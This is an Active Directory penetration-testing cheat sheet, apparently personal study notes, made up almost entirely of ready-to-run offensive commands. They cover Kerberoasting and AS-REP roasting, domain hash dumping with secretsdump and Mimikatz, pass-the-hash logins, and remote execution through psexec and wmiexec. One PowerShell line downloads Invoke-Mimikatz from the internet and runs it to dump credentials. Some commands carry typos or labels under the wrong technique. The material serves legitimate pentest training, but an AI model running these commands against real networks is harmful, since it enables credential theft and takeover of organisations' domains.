# Active Directory Cheatsheet     
## Contents 
- [Active Directory Cheatsheet](#active-directory-cheatsheet)
  * [Contents](#contents)
  * [Quick Commands](#quick-commands)
    + [Files to Check](#files-to-check)
  * [Resources](#resources)
  * [Cheat Sheets](#cheat-sheets)
  * [General Tools](#general-tools)
  * [Kerberos (Port 88)](#kerberos--port-88-)
    + [Kerberoasting with Impacket](#kerberoasting-with-impacket)
  * [GetUserSPNs](#getuserspns)
  * [Using TGT key to excute remote commands from the following impacket scripts:](#using-tgt-key-to-excute-remote-commands-from-the-following-impacket-scripts-)
  * [LDAP (Port 636)](#ldap--port-636-)
  * [Post Exploitation](#post-exploitation)
    + [PowerView](#powerview)
  * [Bloodhound](#bloodhound)
  * [Mimikatz](#mimikatz)
- [Resources](#resources-1)
  * [Active Directory Enumeration | ATTL4S](#active-directory-enumeration---attl4s)
  * [Adsecurity Blog](#adsecurity-blog)
  * [RedTeam Security Live Hacking Demonstration](#redteam-security-live-hacking-demonstration)
  * [Pentesting AD CheatSheet](#pentesting-ad-cheatsheet)
  * [NetNTLMtoSilverTicket | NotMedic's Github](#netntlmtosilverticket---notmedic-s-github)

## Quick Commands  

    net users
    net users /domain
    net localgroup
    net groups /domain
    net groups /domain "Domain Admins"

PowerShell Active Directory Module (on DC)

    Get-ADUser
    Get-ADDomain
    Get-ADGroup
    Get-ADGroupMember -identity "Domain Admins" -Domain test.local -DomainController 10.10.10.10
    Find-DomainShare
 
### Files to Check  
    %SYSTEMROOT%\System32\ntds.dit             #AD database
    %SYSTEMROOT%\NTDS\ntds.dit                 #AD backup 

## Resources      
[WADComs](https://wadcoms.github.io/)    

## Cheat Sheets
[AD Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)     
[AD Lateral Movement and Persistence Cheatsheet](https://bhanusnotes.blogspot.com/2020/12/ad-pentest-lateral-movement-persistance.html)  
[AD Cheat sheet](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)   
[Integratio IT Cheat Sheet](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet)  

## General Tools  
[Impacket](https://github.com/SecureAuthCorp/impacket)   

    apt install impacket-scripts  
    /usr/share/doc/python3-impacket/examples  
    
[evil-winrm](https://github.com/nubix/evil-winrm)    
[ADSC-Pwn](https://github.com/bats3c/ADCSPwn)   

## Kerberos (Port 88)   
[Kerbrute](https://github.com/ropnop/kerbrute), [Rubeus](https://github.com/GhostPack/Rubeus)   
[Kerberos Tickets](https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel)   
[Kerberos Cheat Sheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)  
[How Kerberos Works](https://www.tarlogic.com/blog/how-kerberos-works/)  


    ./kerbrute userenum userlist.txt -d [name] --dc [name]     

### Kerberoasting with Impacket 

Get a list of valid users: ASREProasting to see if any of them do not have pre-auth set and can request a Kerberos ticket without a password. Crack hashes with hashcat        

    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.local/ -no-pass -usersfile users.txt         
    
If you have creds for the backup account for domain controller: can dump all hashes    

    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup:backuppassword@domain.local
    
Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't neeed to be cracked)    

    evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]    
    
    ## Check for Kerberoasting: 

- GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip <IP> -format hashcat/john

## GetUserSPNs

ASREPRoast:
- impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
- impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

Kerberoasting: 
- impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file> 

Overpass The Hash/Pass The Key (PTK):
- python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
- python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
- python3 getTGT.py <domain_name>/<user_name>:[password]

## Using TGT key to excute remote commands from the following impacket scripts:

- python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
- python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
- python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass


## LDAP (Port 636)
Anonymous Credential LDAP Dumping: 

    ldapsearch -LLL -x -H ldap://<domain fqdn> -b ‘’ -s base ‘(objectclass=*)’

Impacket GetADUsers.py (Must have valid credentials)

    GetADUsers.py -all <domain\User> -dc-ip <DC_IP>

Impacket lookupsid.py:

    /usr/share/doc/python3-impacket/examples/lookupsid.py username:password@172.21.0.0

Impacket Secretdump:

    python3 secretdump.py 'breakme.local/Administrator@172.21.0.0' -just-dc-user anakin

Windapsearch:

https://github.com/ropnop/windapsearch 

    python3 windapsearch.py -d host.domain -u domain\\ldapbind -p PASSWORD -U


## Post Exploitation    
### PowerView   
Powershell script to enum domain after gaining admin access to machine   

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)   
[PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)    
[Cheat sheet](https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/)   

    powershell -ep bypass   
    . .\PowerView.ps1   
    Get-NetDomain   
    Get-NetUser   
    Get-NetComputer -fulldata   
    
## Bloodhound    
[Bloodhound](https://github.com/BloodHoundAD/BloodHound)   
Bloodhound - GUI app installed on attack box, SharpHound - powershell script to enum and collect data -> exfiltrate as a zip file.     

    apt-get install bloodhound     

on victim, transfer file then import into Bloodhound and run queries   
    . .\SharpHound.ps1   
    Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip        
    
## Mimikatz  
[Mimikatz and Password Dumps Reference](https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/) 
[Online Password Cracker - Crackstation](https://crackstation.net/)   

    privilege::debug
    lsadump::sam
Powershell Script 

    powershell.exe-exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

    
# Resources
[Understanding Windows Lateral Movement](https://attl4s.github.io/assets/pdf/Understanding_Windows_Lateral_Movements.pdf)  

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise)

[Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/)



## Active Directory Enumeration | ATTL4S
https://attl4s.github.io/assets/pdf/Understanding_Active_Directory_Enumeration.pdf

## Adsecurity Blog
https://adsecurity.org/

## RedTeam Security Live Hacking Demonstration 
https://www.youtube.com/watch?v=k6EOhO3JKCQ

## Pentesting AD CheatSheet
https://i.ibb.co/TKYNCNP/Pentest-ad.png


## NetNTLMtoSilverTicket | NotMedic's Github
https://github.com/NotMedic/NetNTLMtoSilverTicket
